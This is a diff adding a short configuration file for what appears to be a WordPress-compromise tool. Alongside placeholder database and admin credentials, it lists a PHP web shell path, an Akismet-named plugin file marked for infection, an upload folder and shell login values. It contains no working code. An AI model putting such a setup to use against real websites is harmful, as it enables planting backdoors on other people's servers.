@@ -1,0 +1,20 @@
+#Quantity of current process for processin new domains
+PROC_QUANTITY=1
+
+#MYSQL Fake settings
+MYSQL_DB_NAME=testdb
+MYSQL_USERNAME=test
+MYSQL_DB_PW=test
+MYSQL_HOST=sql.dummyhosting.net
+
+#WordPress fake settings
+WORDPRESS_ADM=admin
+WORDPRESS_ADM_PW=admin
+
+#SHELL
+DEFAULT_PATH=/var/www/html
+PHP_SHELL=./shells/shell.php
+PLUGIN_FILE_INFECT=./plugins/akismet/class.akismet-plug.php
+PLUGIN_UPLOAD=./plugins/akismet/
+SHELL_USER=test
+SHELL_PW=test
